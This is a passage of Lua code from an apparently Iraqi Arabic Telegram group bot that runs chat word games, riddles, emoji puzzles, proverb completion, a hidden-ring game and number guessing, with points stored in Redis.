name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
taha = '🚀¦اسرع واحد يدز » {`'..name..'`}'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(datahmade:get('SNIEBR:'..bot_id..'klmos'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('SNIEBR:'..bot_id..'l:ids'..msg.chat_id_) then
if not datahmade:get('SNIEBR:'..bot_id..'l:ids'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل سمايلات ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
datahmade:incrby('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
datahmade:incrby('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    

end
datahmade:set('SNIEBR:'..bot_id..'l:ids'..msg.chat_id_,true)
end 
if text == 'الاسرع' and datahmade:get('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) then
datahmade:del('SNIEBR:'..bot_id..'l:id'..msg.chat_id_)
katu = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = katu[math.random(#katu)]
datahmade:set('SNIEBR:'..bot_id..'klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
taha = '🚀¦اسرع واحد يرتبها » {'..name..'}'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(datahmade:get('SNIEBR:'..bot_id..'klmo'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('SNIEBR:'..bot_id..'l:id'..msg.chat_id_) then
if not datahmade:get('SNIEBR:'..bot_id..'l:id'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍??| لعب مره اخره ارسل الاسرع ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
datahmade:incrby('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1) 
datahmade:incrby('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    

end
datahmade:set('SNIEBR:'..bot_id..'l:id'..msg.chat_id_,true)
end 
if text == 'حزوره' and datahmade:get('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) then
datahmade:del('SNIEBR:'..bot_id..'l:id1'..msg.chat_id_)
katu = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = katu[math.random(#katu)]
datahmade:set('SNIEBR:'..bot_id..'klmoa'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
taha = '🕐¦اسرع واحد يحلها » {'..name..'}'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(datahmade:get('SNIEBR:'..bot_id..'klmoa'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('SNIEBR:'..bot_id..'l:id1'..msg.chat_id_) then
if not datahmade:get('SNIEBR:'..bot_id..'l:id1'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل حزوره ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
datahmade:incrby('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
datahmade:incrby('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
end
datahmade:set('SNIEBR:'..bot_id..'l:id1'..msg.chat_id_,true)
end 
if text == 'المعاني' and datahmade:get('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) then
datahmade:del('SNIEBR:'..bot_id..'l:id2'..msg.chat_id_)
katu = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = katu[math.random(#katu)]
datahmade:set('SNIEBR:'..bot_id..'means'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
taha = '🔵¦اول واحد يكتب معنئ السمايل » {'..name..'}'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(datahmade:get('SNIEBR:'..bot_id..'means'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('SNIEBR:'..bot_id..'l:id2'..msg.chat_id_) then
if not datahmade:get('SNIEBR:'..bot_id..'l:id2'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل المعاني ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
datahmade:incrby('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
datahmade:incrby('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
end
datahmade:set('SNIEBR:'..bot_id..'l:id2'..msg.chat_id_,true)
end 
if text == 'العكس' and datahmade:get('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) then
datahmade:del('SNIEBR:'..bot_id..'l:id3'..msg.chat_id_)
katu = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = katu[math.random(#katu)]
datahmade:set('SNIEBR:'..bot_id..'aks'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'موحلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'عدل','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
taha = '✖️¦عكس كلمه » {'..name..'} ⚜️'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(datahmade:get('SNIEBR:'..bot_id..'aks'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('SNIEBR:'..bot_id..'l:id3'..msg.chat_id_) then
if not datahmade:get('SNIEBR:'..bot_id..'l:id3'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل العكس ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
datahmade:incrby('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
datahmade:incrby('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
end
datahmade:set('SNIEBR:'..bot_id..'l:id3'..msg.chat_id_,true)
end 
				if datahmade:get('SNIEBR:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
taha = "*📬¦ عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 } *\n"
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
return false  end 
local GETNUM = datahmade:get('SNIEBR:'..bot_id.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
datahmade:del('SNIEBR:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
datahmade:del('SNIEBR:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
datahmade:incrby('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 5)  
datahmade:incrby('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 5)    
taha = '*🔖¦ مبروك فزت ويانه وخمنت الرقم الصحيح\n🚸¦ تم اضافة { 5 } من النقاط *\n'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
datahmade:incrby('SNIEBR:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(datahmade:get('SNIEBR:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
datahmade:del('SNIEBR:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
datahmade:del('SNIEBR:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
taha = '\n*📮┇ اوبس لقد خسرت في اللعبه \n??┇ حظآ اوفر في المره القادمه \n🔰┇ كان الرقم الذي تم تخمينه { '..GETNUM..' }\n*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
else
taha = '\n*📛¦ اوبس تخمينك غلط \n📌¦ ارسل رقم تخمنه مره اخره \n*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
end
end
end

if datahmade:get('SNIEBR:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
taha = "*📬¦ عذرا لا يوجد سواء { 6 } اختيارات فقط ارسل اختيارك مره اخره*\n"
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
return false  end 
local GETNUM = datahmade:get('SNIEBR:'..bot_id.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
datahmade:del('SNIEBR:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
taha = '*📮¦ مبروك فزت وطلعت المحيبس بل ايد رقم { '..NUM..' }\n🎊¦ لقد حصلت على { 3 }من نقاط يمكنك استبدالهن برسائل *'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
datahmade:incrby('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 3)  
datahmade:incrby('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 3)    
elseif tonumber(NUM) ~= tonumber(GETNUM) then
datahmade:del('SNIEBR:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
taha = '\n*📮¦ للاسف لقد خسرت \n📬¦ المحيبس بل ايد رقم { '..GETNUM..' }\n💥¦ حاول مره اخرى للعثور على المحيبس *'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
end
end
if text == datahmade:get('SNIEBR:'..bot_id..':Set_alii:'..msg.chat_id_) then -- // المختلف
datahmade:incrby('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
datahmade:incrby('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
datahmade:del('SNIEBR:'..bot_id..':Set_alii:'..msg.chat_id_)
taha = '*  🎁  احسنت اجابتك صحيحه   \n* '
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end

if text == datahmade:get('SNIEBR:'..bot_id..':Set_Amthlh:'..msg.chat_id_) then -- // امثله
datahmade:incrby('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
datahmade:incrby('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
datahmade:del('SNIEBR:'..bot_id..':Set_Amthlh:'..msg.chat_id_)
taha = '*  🎁  احسنت اجابتك صحيحه   \n* '
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end

if text == 'المختلف' and datahmade:get('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) then
katu = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','✨','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',
};
name = katu[math.random(#katu)]
datahmade:set('SNIEBR:'..bot_id..':Set_alii:'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😹😹😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠','💀💀💀💀💀💀💀☠💀💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼👻👻👻👻👻')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟')
name = string.gsub(name,'✨','💫💫💫💫💫✨💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃☃☃☃☃☃⛄️☃☃☃☃')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀','🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂')
name = string.gsub(name,'🧜‍♂','🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♂🧜‍♀🧜‍♀🧜‍♀')
name = string.gsub(name,'🧝‍♂','🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀')
name = string.gsub(name,'🙍‍♂','🙎‍♂🙎‍♂🙎‍♂🙎‍♂🙎‍♂🙍‍♂🙎‍♂🙎‍♂🙎‍♂')
name = string.gsub(name,'🧖‍♂','🧖‍♀🧖‍♀🧖‍♀🧖‍♀🧖‍♀🧖‍♂🧖‍♀🧖‍♀🧖‍♀🧖‍♀')
name = string.gsub(name,'👬','👭👭👭👭👭👬??👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕒','🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📆📅📆📆')
TEST = '  اول واحد يطلع المختلف » {* '..name..' * } ' 
send(msg.chat_id_, msg.id_, 1,TEST, 1, 'md')
end

if text == 'امثله' and datahmade:get('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) then
katu = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = katu[math.random(#katu)]
datahmade:set('SNIEBR:'..bot_id..':Set_Amthlh:'..msg.chat_id_,name)
name = string.gsub(name,'جوز','ينطي____للماعده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل___')
name = string.gsub(name,'بيدك','اكل___محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من___نعال')
name = string.gsub(name,'شقره','مع الخيل يا___')
name = string.gsub(name,'النخله','الطول طول___والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر___')
name = string.gsub(name,'الخيل','من قلة___شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني___')
name = string.gsub(name,'المبلل','___ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة___')
name = string.gsub(name,'يركص','المايعرف___يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح___يكول حامض')
name = string.gsub(name,'العمه','___إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي___للخباز حتى لو ياكل نصه')
name = string.gsub(name,'باحصاد','اسمة___ومنجله مكسور')
name = string.gsub(name,'شهر','امشي__ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن__يا من على الحاضر لكة')
name = string.gsub(name,'القرد','__بعين امه غزال')
name = string.gsub(name,'يكحله','اجه___عماها')
TEST = 'اكمل المثل التالي {* '..name..' *}'
send(msg.chat_id_, msg.id_, 1,TEST, 1, 'md')
end
if text == 'محيبس' or text == 'بات' then
if datahmade:get('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) then   
Num = math.random(1,6)
datahmade:set('SNIEBR:'..bot_id.."GAMES"..msg.chat_id_,Num) 
TEST = [[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊
📮¦ اختر لأستخراج المحيبس الايد التي تحمل المحيبس 
🎁¦ الفائز يحصل على { 3 } من النقاط *
]]
send(msg.chat_id_, msg.id_, 1,TEST, 1, 'md')
datahmade:setex('SNIEBR:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
if text == 'خمن' or text == 'تخمين' then   
if datahmade:get('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) then
Num = math.random(1,20)
datahmade:set('SNIEBR:'..bot_id.."GAMES:NUM"..msg.chat_id_,Num) 
TEST = '*\n📮¦ اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n'..'⚠¦ ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n'..'🔖¦ سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ \n??*'
send(msg.chat_id_, msg.id_, 1,TEST, 1, 'md')
datahmade:setex('SNIEBR:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
if text =='مجوهراتي' then 
if tonumber((datahmade:get('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
taha = '*💎¦ ليس لديك مجوهرات \n📬¦ للحصول على مجوهرات ارسل الاسرع وابدأ اللعب*\n'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
else
taha = '*💎¦ عدد مجوهراتك الحاليه  ('..(datahmade:get('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_))..')*'
taha1 = '*💎¦ مجموع مجوهراتك  ('..(datahmade:get('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))..')*'

send(msg.chat_id_, msg.id_, 1,''..taha..'\n'..taha1..'', 1, 'md')
end
end
if text:match('^رسائل المجوهرات (%d+)$') and (is_creator(msg) or is_creatorbasic(msg)) then
local kara = {string.match(text, "^(رسائل المجوهرات) (%d+)$")}
if tonumber(kara[2]) > 500 or tonumber(kara[2]) < 1 then
msgg = '💎┇لا تستطيع وضع اكثر من 500 رساله ❌ '
send(msg.chat_id_, msg.id_, 1, msgg, 1, 'html')
else
datahmade:set('SNIEBR:'..bot_id..'gamepoint' .. msg.chat_id_, kara[2] or 50)
send(msg.chat_id_, msg.id_, 1,'💎¦تم اضافه عدد الرسائل المطلوب ✅  ', 1, 'md')
end
end
if text == 'بيع مجوهراتي' then
if tonumber((datahmade:get('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
taha = '*💠¦ ليس لديك مجوهرات \n📬¦ للحصول على مجوهرات ارسل الاسرع وابدأ اللعب*\n'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
else
taha = (datahmade:get('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(datahmade:get('SNIEBR:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
datahmade:incrby('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,taha)  
datahmade:del('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)
taha = tonumber((datahmade:get('SNIEBR:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
send(msg.chat_id_, msg.id_, 1,'💎¦ تم بيع جواهرك كل مجوهره تساوي '..taha..' رساله', 'md')
end
end
if text == 'حذف مجوهراتي' then
datahmade:del('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)  
datahmade:del('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_)  
send(msg.chat_id_, msg.id_, 1, "تم حذف جميع مجوهراتك", 1, "md") 
end
if text == 'حذف رسائلي' then
datahmade:del('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
datahmade:del('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, "🗑 ┇ تم حذف رسائلك  ", 1, "md") 
end
---------------------------------------------------------------------------
if text == 'تفعيل اللعبه' and (is_owner(msg) or is_creatorbasic(msg)) then   
send(msg.chat_id_, msg.id_, 1,[[*
✔️| تم تفعيل الالعاب بنجاح  
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📋| الالعاب المتاحه لديك هي ↓
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🚸| ارسل امر (الاسرع) لبدء لعبه
